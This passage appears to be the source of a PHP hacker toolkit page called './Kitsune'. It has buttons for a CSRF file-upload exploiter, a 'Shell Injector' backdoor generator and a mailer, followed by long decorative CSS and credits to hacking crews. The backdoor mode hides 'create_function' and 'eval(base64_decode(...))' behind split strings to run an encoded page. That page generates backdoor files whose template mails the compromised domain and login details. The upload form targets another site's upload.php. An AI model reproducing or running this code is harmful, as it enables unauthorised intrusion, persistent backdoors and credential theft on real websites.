C9oZWFkPgogICAgIDxib2R5PiA8Ym9keSBiZ2NvbG9yPSJibGFjayI+IDxjZW50ZXI+IAogICAgIDx0YWJsZSB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJz4gPHRkIGFsaWduPSdjZW50ZXInPiAJCiAgICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4gLyogbGF0aW4gKi8gQGZvbnQtZmFjZSB7IGZvbnQtZmFtaWx5OiAnSWNlbGFuZCc7IGZvbnQtc3R5bGU6IG5vcm1hbDsgZm9udC13ZWlnaHQ6IDQwMDsgc3JjOiBsb2NhbCgnSWNlbGFuZCcpLCBsb2NhbCgnSWNlbGFuZC1SZWd1bGFyJyksIHVybChodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tL3MvaWNlbGFuZC92OC9yYXg5SGl1RnNkTU5PbldQYUt0TUFSSllrMG8ud29mZjIpIGZvcm1hdCgnd29mZjInKTsgdW5pY29kZS1yYW5nZTogVSswMDAwLTAwRkYsIFUrMDEzMSwgVSswMTUyLTAxNTMsIFUrMDJCQi0wMkJDLCBVKzAyQzYsIFUrMDJEQSwgVSswMkRDLCBVKzIwMDAtMjA2RiwgVSsyMDc0LCBVKzIwQUMsIFUrMjEyMiwgVSsyMTkxLCBVKzIxOTMsIFUrMjIxMiwgVSsyMjE1LCBVK0ZFRkYsIFUrRkZGRDsgfSAJPC9zdHlsZT4gCiAgICAgPGZvbnQgZmFjZT0iSWNlbGFuZCIgY29sb3I9InJlZCIgc2l6ZT0iOCI+IDxiPjxpPk9ubGluZSA8Zm9udCBjb2xvcj0iYmxhY2siPkNTUkYgPGZvbnQgY29sb3I9ImJsYWNrIj5FeHBsb2l0ZXI8L2ZvbnQ+PC9iPjwvaT48L2ZvbnQ+ICAgIDxicj4gPGJyPiA8L2NlbnRlcj4KIDxjZW50ZXI+Cjxmb3JtIG1ldGhvZD0icG9zdCI+ClVSTDogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVybCIgc2l6ZT0iNTAiIGhlaWdodD0iMTAiIHBsYWNlaG9sZGVyPSJodHRwOi8vd3d3LnRhcmdldC5jb20vW3BhdGhdL3VwbG9hZC5waHAiIHN0eWxlPSJtYXJnaW46IDVweCBhdXRvOyBwYWRkaW5nLWxlZnQ6IDVweDsiIHJlcXVpcmVkPjxicj4KUE9TVCBGaWxlOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGYiIHNpemU9IjUwIiBoZWlnaHQ9IjEwIiBwbGFjZWhvbGRlcj0iRmlsZWRhdGEgLyBmaWxlc1tdIC8gcXFmaWxlIC8gdXNlcmZpbGUgLyBkbGwiIHN0eWxlPSJtYXJnaW46IDVweCBhdXRvOyBwYWRkaW5nLWxlZnQ6IDVweDsiIHJlcXVpcmVkPjxicj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iZCIgdmFsdWU9Ikt1bmNpIFRhcmdldCEhISI+CjwvZm9ybT4KPD9waHAKJHVybCA9ICRfUE9TVFsndXJsJ107CiRwZiA9ICRfUE9TVFsncGYnXTsKJGQgPSAkX1BPU1RbJ2QnXTsKaWYoJGQpIHsKICAgIGVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgdGFyZ2V0PSdfYmxhbmsnIGFjdGlvbj0nJHVybCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9JyRwZic+PGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nZycgdmFsdWU9J1VwbG9hZCBDb2shJz48L2Zvcm0iOwp9Cj8+CjwvZm9ybT4KPC9odG1sPg==");exit;}?>
<?php if(isset($_GET["kitsune"])&&$_GET["kitsune"]=="backdoor"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PGh0bWw+IDxoZWFkPiAKPHN0eWxlPgoJaHRtbCB7CgkJYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CgkJZm9udC1mYW1pbHk6ICJJY2ViZXJnIjsKCX0KCWJvZHkgewoJCWJhY2tncm91bmQ6IHVybCgiaHR0cHM6Ly9pLmliYi5jby82NDl5Q3E3L0lNRy05OTk0LW1yMTU4Mzc0NjQ4ODM0OS5qcGciKSAjMjkzYTRhIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyIGZpeGVkOwoJCWJhY2tncm91bmQtc2l6ZTogY292ZXI7Cgl9Cjwvc3R5bGU+CjxsaW5rICByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9pLmliYi5jby9zdnNUOHFxL0lNRy0wMDI5LW1yMTU4Mzc0NTAzMTQxNS5qcGciPiAKPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ii4tOlsgTWlMRiBdOi0uIj4gCjxtZXRhIGNvbnRlbnQ9J2luc3RhZ3JhbS5jb20va2l0c3VuZV9ieXRlJyBwcm9wZXJ0eT0nb2c6dXJsJy8+CjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJBMyI+IAo8bWV0YSBodHRwLWVxdWl2PSJjYWNoZS1jb250cm9sIiBjb250ZW50PSJpbmRleCxjYWNoZSI+CiA8bWV0YSBodHRwLWVxdWl2PSJwcmFnbWEiIGNvbnRlbnQ9ImluZGV4LGNhY2hlIj4gCiA8dGl0bGU+Li06WyAuL0tpdHN1bmUgLSBCYWNrZG9vciBdOi0uPC90aXRsZT4KICAgPHNjcmlwdCBzcmM9Imh0dHA6Ly9lLW1ldGUuY29tL2pzL2tkc25vdy5qcyIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij48L3NjcmlwdD4KICAgPHNjcmlwdCBzcmM9Imh0dHA6Ly9lLW1ldGUuY29tL2pzL2tkc25vdy5qcyIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij48L3NjcmlwdD4KICAgIDwvaGVhZD4KICAgICA8Ym9keT4gPGJvZHkgYmdjb2xvcj0iYmxhY2siPiA8Y2VudGVyPiAKICAgICA8dGFibGUgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTAwJSc+IDx0ZCBhbGlnbj0nY2VudGVyJz4gCQogICAgIDxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+IC8qIGxhdGluICovIEBmb250LWZhY2UgeyBmb250LWZhbWlseTogJ0ljZWxhbmQnOyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQtd2VpZ2h0OiA0MDA7IHNyYzogbG9jYWwoJ0ljZWxhbmQnKSwgbG9jYWwoJ0ljZWxhbmQtUmVndWxhcicpLCB1cmwoaHR0cHM6Ly9mb250cy5nc3RhdGljLmNvbS9zL2ljZWxhbmQvdjgvcmF4OUhpdUZzZE1OT25XUGFLdE1BUkpZazBvLndvZmYyKSBmb3JtYXQoJ3dvZmYyJyk7IHVuaWNvZGUtcmFuZ2U6IFUrMDAwMC0wMEZGLCBVKzAxMzEsIFUrMDE1Mi0wMTUzLCBVKzAyQkItMDJCQywgVSswMkM2LCBVKzAyREEsIFUrMDJEQywgVSsyMDAwLTIwNkYsIFUrMjA3NCwgVSsyMEFDLCBVKzIxMjIsIFUrMjE5MSwgVSsyMTkzLCBVKzIyMTIsIFUrMjIxNSwgVStGRUZGLCBVK0ZGRkQ7IH0gCTwvc3R5bGU+IAogICAgIDxmb250IGZhY2U9IkljZWxhbmQiIGNvbG9yPSJyZWQiIHNpemU9IjgiPiA8Yj48aT5CYWNrZG9vciA8Zm9udCBjb2xvcj0iYmxhY2siPkdlbmVyYXRvcjwvZm9udD48L2I+PC9pPjwvZm9udD4gICAgPGJyPiA8YnI+IDwvY2VudGVyPgogPGNlbnRlcj4KICAgIDxmb3JtIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGNlbnRlcj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2VtYWlsJyBwbGFjZWhvbGRlcj0nWW91ciBFbWFpbCc+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1c2VyJyBwbGFjZWhvbGRlcj0ncG9zdG5hbWUge3VzZXJ9Jz4KICAgICAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3Bhc3MnIHBsYWNlaG9sZGVyPSdwb3N0bmFtZSB7cGFzc30nPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd4eCc+CiAgICA8L2Zvcm0+CjwvaHRtbD4KPD9waHAKLyoKICAgIENvZGVkIEJ5OiB4U2VjdXJpdHkKICAgIFR3aXR0ZXI6IEB4U2VjTGFicwogICAgR3JlZXRzIFRvIHtyM20wdDMgbnUxMX0KKi8KICAgICRVU0VSX05BTUUgPSAkX1BPU1RbJ3VzZXInXTsKICAgICRVU0VSX1BBU1MgPSAkX1BPU1RbJ3Bhc3MnXTsKICAgICRVU0VSX0VNQUlMID0gJF9QT1NUWydlbWFpbCddOwogICAgaWYoaXNzZXQoJF9QT1NUWyd4eCddKSkgewogICAgICAgICRjMGQzID0gIklDQWdJQ1JsYldGcGJDQTlJQ0o0YzJWak1TSTdDaUFnSUNBa1pHOXRZV2x1SUQwZ0pGOVRSVkpXUlZKYkowaFVWRkJmU0U5VFZDZGRMaUl2SWk0a1gxTkZVbFpGVWxzblVrVlJWVVZUVkY5VlVra25YVHNLSUNBZ0lDUjBhWFJzWlNBOUlDSmJLMTBnZUZObFkzVnlhWFI1SUVKaFkydGtiMjl5SUZKbGMzVnNkRG9nZXlSa2IyMWhhVzU5SUZzclhTSTdDaUFnSUNBa2VITmxZeUE5SUNJckt5c3JLeXNyS3lzckt5c3JLeUI0VTJWamRYSnBkSGtnUW1GamEyUnZiM0lnUjJWdVpYSmhkRzl5SUNzckt5c3JLeXNyS3lzckt5c3JYRzRpT3dvZ0lDQWdKSGh6WldNZ0xqMGdJa1J2YldGcGJqb2dJaTRrWkc5dFlXbHVMaUpjYmlJN0NpQWdJQ0FrZUhObFl5QXVQU0FpVlhObGNtNWhiV1U2SUNJdUpGOVFUMU5VV3lkNGMyVmpNaWRkTGlKY2JpSTdDaUFnSUNBa2VITmxZeUF1UFNBaVVHRnpjM2R2Y21RNklDSXVKRjlRVDFOVVd5ZDRjMlZqTXlkZExpSmNiaUk3Q2lBZ0lDQWtlSE5sWXlBdVBTQWlWR2hoYm10eklFWnZjaUJWYzJsdVp5Qk5lU0JDWVdOclpHOXZjaUFzSUZSM2FYUjBaWEk2SUVCNGMyVmpiR0ZpYzF4dUlqc0tJQ0FnSUNSNGMyVmpJQzQ5SUNJckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c2lPd29nSUNBZ2JXRnBiQ2drWlcxaGFXd3NKSFJwZEd4bExDUjRjMlZqS1RzPSI7CiAgICAgICAgJGFyciA9IGFycmF5KCJ4c2VjMSIgPT4gJFVTRVJfRU1BSUwsICJ4c2VjMiIgPT4gJFVTRVJfTkFNRSwgInhzZWMzIiA9PiAkVVNFUl9QQVNTKTsKICAgICAgICAkcmFuZCA9IHJhbmQoMCw5OTk5OTkpOwogICAgICAgICRjcmVhdGUgPSBmaWxlX3B1dF9jb250ZW50cygieHNlYy17JHJhbmR9LnR4dCIsIHN0cl9yZXBsYWNlKGFycmF5X2tleXMoJGFyciksICRhcnIsIGJhc2U2NF9kZWNvZGUoJGMwZDMpKSk7CiAgICAgICAgaWYoJGNyZWF0ZSkgewogICAgICAgICAgICBwcmludCAiPGJyPjxicj4gKDxmb250IGNvbG9yPSdncmVlbic+ZG9uZTwvZm9udD4pIG9wZW4geHNlYy17JHJhbmR9LnR4dCI7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcHJpbnQgJ2Vycm9yJzsKICAgICAgICB9CiAgICB9CiAKPz4=");exit;}?>
<html>
    <head> 
        <style>
	html {
		background-color: black;
		font-family: "Iceberg";
	}
	body {
		background: url("https://i.ibb.co/649yCq7/IMG-9994-mr1583746488349.jpg") #293a4a no-repeat center center fixed;
		background-size: cover;
	}
        </style>

<link rel="icon" type="image/x-icon" href="https://i.ibb.co/svsT8qq/IMG-0029-mr1583745031415.jpg"> 
<meta name="description" content=".-:[ MiLF ]:-."> 
<meta content='instagram.com/kitsune_byte' property='og:url'/>
<meta name="keywords" content="A3"> 
<meta http-equiv="cache-control" content="index,cache">
<meta http-equiv="pragma" content="index,cache"> 

<title>
    .-:[ ./Kitsune ]:-.
    </title>
 
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="http://e-mete.com/js/kdsnow.js" type="text/javascript"></script>
<script src="http://e-mete.com/js/kdsnow.js" type="text/javascript"></script>

</head>
<script>alert("Warning!!! [18+]");</script>
<body bgcolor="black">
    <style type="text/css">
    * {
    cursor: url(https://ani.cursors-4u.net/cursors/cur-13/cur1160.ani), url(http://ani.cursors-4u.net/cursors/cur-13/cur1160.png), auto !important;
    }
</style>
        <a href="http://www.cursors-4u.com/cursor/2018/06/08/hell-yeah-pointer-3.html" target="_blank" title="Hell Yeah Pointer 3">
        <img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Hell Yeah Pointer 3" style="position:absolute; top: 0px; right: 0px;" />
    </a>
<center>
    <table width='100%' height='100%'> <td align='center'>
        <style type="text/css">
         @font-face {
         font-family: 'Iceland'; 
         font-style: normal; 
         font-weight: 400; 
         src: local('Iceland'), local('Iceland-Regular'), url(https://fonts.gstatic.com/s/iceland/v8/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2'); 
         unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
         }
         </style> 
    </center>
<br><br>
<style>
@import url(https://fonts.googleapis.com/css?family=Raleway:100,900);
@-webkit-keyframes flip-top {
  from {
    -webkit-transform: rotate(50deg) translateY(120vh);
            transform: rotate(50deg) translateY(120vh);
  }
}
@keyframes flip-top {
  from {
    -webkit-transform: rotate(50deg) translateY(120vh);
            transform: rotate(50deg) translateY(120vh);
  }
}
@-webkit-keyframes flip-bottom {
  from {
    -webkit-transform: rotate(-50deg) translateY(120vh);
            transform: rotate(-50deg) translateY(120vh);
  }
}
@keyframes flip-bottom {
  from {
    -webkit-transform: rotate(-50deg) translateY(120vh);
            transform: rotate(-50deg) translateY(120vh);
  }
}
body {
  display: -webkit-box;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-pack: center;
      -ms-flex-pack: center;
          justify-content: center;
  -webkit-box-align: center;
      -ms-flex-align: center;
          align-items: center;
  height: 100vh;
  overflow: hidden;
  -webkit-animation: glow 8s both;
          animation: glow 8s both;
}
span {
  font: 700 15vw Raleway;
  position: relative;
  display: inline-block;
  -webkit-perspective: 70px;
          perspective: 70px;
}
span:nth-child(odd):before {
  -webkit-animation-name: flip-top;
          animation-name: flip-top;
}
span:nth-child(odd):after {
  -webkit-animation-name: flip-bottom;
          animation-name: flip-bottom;
}
span:nth-child(even):before {
  -webkit-animation-name: flip-bottom;
          animation-name: flip-bottom;
}
span:nth-child(even):after {
  -webkit-animation-name: flip-top;
          animation-name: flip-top;
}
span:nth-child(1n + 0):before {
  color: #0d7aff;
}
span:nth-child(1n + 0):after {
  color: #ff0a37;
}
span:nth-child(2n + 1):before {
  color: #0d7aff;
}
span:nth-child(2n + 1):after {
  color: #ff0a37;
}
span:nth-child(3n+ 2):before {
  color: #0d7aff;
}
span:nth-child(3n + 2):after {
  color: #ff0a37;
}
span:nth-child(4n + 3):before {
  color: #0d7aff;
}
span:nth-child(4n + 3):after {
  color: #ff0a37;
}
span:nth-child(1):before {
  -webkit-animation-delay: 0.48706s;
          animation-delay: 0.48706s;
}
span:nth-child(1):after {
  -webkit-animation-delay: 0.92717s;
          animation-delay: 0.92717s;
}
span:nth-child(2):before {
  -webkit-animation-delay: 1.36318s;
          animation-delay: 1.36318s;
}
span:nth-child(2):after {
  -webkit-animation-delay: 1.79375s;
          animation-delay: 1.79375s;
}
span:nth-child(3):before {
  -webkit-animation-delay: 2.11756s;
          animation-delay: 2.11756s;
}
span:nth-child(3):after {
  -webkit-animation-delay: 2.53328s;
          animation-delay: 2.53328s;
}
span:nth-child(4):before {
  -webkit-animation-delay: 2.93965s;
          animation-delay: 2.93965s;
}
span:nth-child(4):after {
  -webkit-animation-delay: 3.3354s;
          animation-delay: 3.3354s;
}
span:nth-child(5):before {
  -webkit-animation-delay: 3.71932s;
          animation-delay: 3.71932s;
}
span:nth-child(5):after {
  -webkit-animation-delay: 4.19022s;
          animation-delay: 4.19022s;
}
span:nth-child(6):before {
  -webkit-animation-delay: 4.54696s;
          animation-delay: 4.54696s;
}
span:nth-child(6):after {
  -webkit-animation-delay: 4.98843s;
          animation-delay: 4.98843s;
}
span:nth-child(7):before {
  -webkit-animation-delay: 5.31358s;
          animation-delay: 5.31358s;
}
span:nth-child(7):after {
  -webkit-animation-delay: 5.72141s;
          animation-delay: 5.72141s;
}
span:nth-child(8):before {
  -webkit-animation-delay: 6.11098s;
          animation-delay: 6.11098s;
}
span:nth-child(8):after {
  -webkit-animation-delay: 6.58137s;
          animation-delay: 6.58137s;
}
span:nth-child(9):before {
  -webkit-animation-delay: 6.93177s;
          animation-delay: 6.93177s;
}
span:nth-child(9):after {
  -webkit-animation-delay: 7.36139s;
          animation-delay: 7.36139s;
}
span:nth-child(10):before {
  -webkit-animation-delay: 7.76139s;
          animation-delay: 7.76139s;
}
span:nth-child(10):after {
  -webkit-animation-delay: 8.16139s;
          animation-delay: 8.16139s;
}
span:before, span:after {
  display: block;
  content: attr(data-text);
  -webkit-animation: 1.48889s ease-out both;
          animation: 1.48889s ease-out both;
  -webkit-animation-name: inherit;
          animation-name: inherit;
  text-shadow: 0 0 0em;
}
span:before {
  -webkit-clip-path: polygon(0 0 100% 0, 100% 100%);
  clip-path: polygon(0 0 100% 0, 100% 100%);
  position: absolute;
  -webkit-transform-origin: left center;
          transform-origin: left center;
  color: #4EC0B6;
}
span:after {
  -webkit-clip-path: polygon(0 0, 100% 100%, 0 100%);
  clip-path: polygon(0 0, 100% 100%, 0 100%);
  color: #3967CB;
}
</style>
<center>
     <style>
	.waktu {
		overflow: hidden;
		width: 220px;
	}
	.kotak{
		float: left;
		width: 70px;
		height: 80px;
	}
	.waktu p {
		color: red;
		font-face: Icaland;
		font-size: 36px;
		text-align: center;
		margin-top: 30px;
	}
    </style>
<span data-text="."></span>
<span data-text="/"></span>
<span data-text="k"></span>
<span data-text="i"></span>
<span data-text="t"></span>
<span data-text="s"></span>
<span data-text="u"></span>
<span data-text="n"></span>
<span data-text="e"></span>
<div class="waktu">
	<div class="kotak">
		<p id="jam"></p>
	</div>
	<div class="kotak">
		<p id="menit"></p>
	</div>
	<div class="kotak">
		<p id="detik"></p>
	</div>
</div>
<script>
	window.setTimeout("waktu()", 1000);
	function waktu() {
		var waktu = new Date();
		setTimeout("waktu()", 1000);
		document.getElementById("jam").innerHTML = waktu.getHours();
		document.getElementById("menit").innerHTML = waktu.getMinutes();
		document.getElementById("detik").innerHTML = waktu.getSeconds();
	}
</script>

<style>
.free {
  box-sizing: border-box;
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
  background-color: transparent;
  border: 2px solid #e74c3c;
  border-radius: 0.6em;
  color: #e74c3c;
  cursor: pointer;
  display: flex;
  align-self: center;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1;
  margin: 20px;
  padding: 1.2em 2.8em;
  text-decoration: none;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
}
.free:hover, .free:focus {
  color: #fff;
  outline: 0;
}
.upload {
  border-color: #3498db;
  color: #fff;
  box-shadow: 0 0 40px 40px #3498db inset, 0 0 0 0 #3498db;
  transition: all 150ms ease-in-out;
}
.upload:hover {
  box-shadow: 0 0 10px 0 #3498db inset, 0 0 10px 4px #3498db;
}
</style>

<br>
	<table>
		<tr>
            <td><button class="free upload"><a href="?kitsune=csrf" class="upload">-CSRF</a></button></td>
	        <td><button class="free upload"><a href="?kitsune=backdoor" class="upload">Shell Injector</a></button></td>
            <td><button class="free upload"><a href="?kitsune=promailer" class="upload">Pro Mailer</a></button></td>
	    </tr>
	</table>
<br>

<style>
/* Tombol Button Pesan */
#friends {
  box-sizing: border-box;
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
  background-color: transparent;
  border: 2px solid #e74c3c;
  border-radius: 0.6em;
  color: #e74c3c;
  cursor: pointer;
  display: flex;
  align-self: center;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1;
  margin: 20px;
  padding: 1.2em 2.8em;
  text-decoration: none;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
}

#friends:hover, #friends:focus {
  color: #fff;
  outline: 0;
}

#friends a {
	width: 100px;
	height: 30px;
	vertical-align: middle;
	background-color: #F00;
	color: #fff;
	text-decoration: none;
	padding: 10px;
	border-radius: 5px;
	border: 1px solid transparent;
}

/* Jendela Pop Up */
#f_topup {
	width: 100%;
	height: 100%;
	position: fixed;
	background: rgba(0,0,0,.7);
	top: 0;
	left: 0;
	z-index: 9999;
	visibility: hidden;
}

.window {
	width: 400px;
	height: 400px;
	background: #fff;
	border-radius: 10px;
	position: relative;
	padding: 10px;
	text-align: center;
	margin: 15% auto;
}
.window h2 {
	margin: 20px 0 0 0;
}
/* Button Close */
.close-friends {
	width: 6%;
	height: 6%;
	line-height: 23px;
	background: #000;
	border-radius: 50%;
	border: 3px solid #fff;
	display: block;
	text-align: center;
	color: #fff;
	text-decoration: none;
	position: absolute;
	top: -10px;
	right: -10px;	
}

/* Memunculkan Jendela Pop Up*/
#f_topup:target {
	visibility: visible;
}


/* Tombol Button Pesan */
#team {
  box-sizing: border-box;
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
  background-color: transparent;
  border: 2px solid #e74c3c;
  border-radius: 0.6em;
  color: #e74c3c;
  cursor: pointer;
  display: flex;
  align-self: center;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1;
  margin: 20px;
  padding: 1.2em 2.8em;
  text-decoration: none;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
}

#team:hover, #team:focus {
  color: #fff;
  outline: 0;
}
#team a {
	width: 100px;
	height: 30px;
	vertical-align: middle;
	background-color: #F00;
	color: #fff;
	text-decoration: none;
	padding: 10px;
	border-radius: 5px;
	border: 1px solid transparent;
}

/* Jendela Pop Up */
#t_topup {
	width: 100%;
	height: 100%;
	position: fixed;
	background: rgba(0,0,0,.7);
	top: 0;
	left: 0;
	z-index: 9999;
	visibility: hidden;
}

.window {
	width: 400px;
	height: 400px;
	background: #fff;
	border-radius: 10px;
	position: relative;
	padding: 10px;
	text-align: center;
	margin: 15% auto;
}
.window h2 {
	margin: 20px 0 0 0;
}
/* Button Close */
.close-team {
	width: 6%;
	height: 6%;
	line-height: 23px;
	background: #000;
	border-radius: 50%;
	border: 3px solid #fff;
	display: block;
	text-align: center;
	color: #fff;
	text-decoration: none;
	position: absolute;
	top: -10px;
	right: -10px;	
}

/* Memunculkan Jendela Pop Up*/
#t_topup:target {
	visibility: visible;
}



/* Tombol Button Pesan */
#sup {
  box-sizing: border-box;
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
  background-color: transparent;
  border: 2px solid #e74c3c;
  border-radius: 0.6em;
  color: #e74c3c;
  cursor: pointer;
  display: flex;
  align-self: center;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1;
  margin: 20px;
  padding: 1.2em 2.8em;
  text-decoration: none;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
}

#sup:hover, #sup:focus {
  color: #fff;
  outline: 0;
}
#sup a {
	width: 100px;
	height: 30px;
	vertical-align: middle;
	background-color: #F00;
	color: #fff;
	text-decoration: none;
	padding: 10px;
	border-radius: 5px;
	border: 1px solid transparent;
}

/* Jendela Pop Up */
#s_topup {
	width: 100%;
	height: 100%;
	position: fixed;
	background: rgba(0,0,0,.7);
	top: 0;
	left: 0;
	z-index: 9999;
	visibility: hidden;
}

.window {
	width: 400px;
	height: 400px;
	background: #fff;
	border-radius: 10px;
	position: relative;
	padding: 10px;
	text-align: center;
	margin: 15% auto;
}
.window h2 {
	margin: 20px 0 0 0;
}
/* Button Close */
.close-sup {
	width: 6%;
	height: 6%;
	line-height: 23px;
	background: #000;
	border-radius: 50%;
	border: 3px solid #fff;
	display: block;
	text-align: center;
	color: #fff;
	text-decoration: none;
	position: absolute;
	top: -10px;
	right: -10px;	
}

/* Memunculkan Jendela Pop Up*/
#s_topup:target {
	visibility: visible;
}
</style>

<table>
<tr>
  <td>
    <div id="friends"><a href="#f_topup">Thanks to my own team</a></div>
    <div id="f_topup">
    	<div class="window">
        	<a href="#" class="close-friends" title="Close">X</a>
            <h2>.-:[ MhankBarBar ]:-.<br>.-:[ Krypton ]:-.<br>.-:[ Underfif ]:-.<br>.-:[ GiovaIT ]:-.<br>.-:[ NoneX9 ]:-.<br>.-:[ ITacHI ]:-.</h2>
        </div>
    </div>
  </td>
  <td>
     <div id="team"><a href="#t_topup">Thanks to my friends</a></div>
    <div id="t_topup">
    	<div class="window">
        	<a href="#" class="close-team" title="Close">X</a>
            <h2>.-:[ Mr.TenAr ]:-.<br>.-:[ ./sendpie404 ]:-.<br>.-:[ Icha ]:-.<br>.-:[ ./TanpaNama ]:-.<br>.-:[ ./0xpl01t3r ]:-.<br>.-:[ Tex7ure ]:-.<br>.-:[ Devil_Star ]:-.<br>.-:[ Babacang07 ]:-.<br>.-:[ Cahsun147 ]:-.<br>.-:[ Havin27 ]:-.<br>.-:[ S3X-B3B4S ]:-.<br>.-:[ Mrs.Cahsun ]:-.</h2>
        </div>
    </div>
  </td>
  <td>
     <div id="sup"><a href="#s_topup">Supported by</a></div>
    <div id="s_topup">
    	<div class="window">
        	<a href="#" class="close-sup" title="Close">X</a>
            <h2>.-:[ Red Eye Cyber Team ]:-.<br>.-:[ Dark Clown Security ]:-.<br>.-:[ Black Demonstration Cyber ]:-.<br>.-:[ Phantom Security ]:-.<br>.-:[ Half Seen Samael ]:-.<br>.-:[ Clown Security Team ]:-.</h2>
        </div>
    </div>
  </td>
</tr>
</table>
<script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-3b9142cc-dafb-446b-b5cf-7d97f46232cc"></div></td></tr></tbody></table></center></body>
<script type="text/javascript" src="https://www.cssscript.com/demo/minimalist-falling-snow-effect-with-pure-javascript-snow-js/snow.js"></script>
<script type="text/javascript" src="https://www.cssscript.com/demo/minimalist-falling-snow-effect-with-pure-javascript-snow-js/snow.js"></script>
</center>
</html>
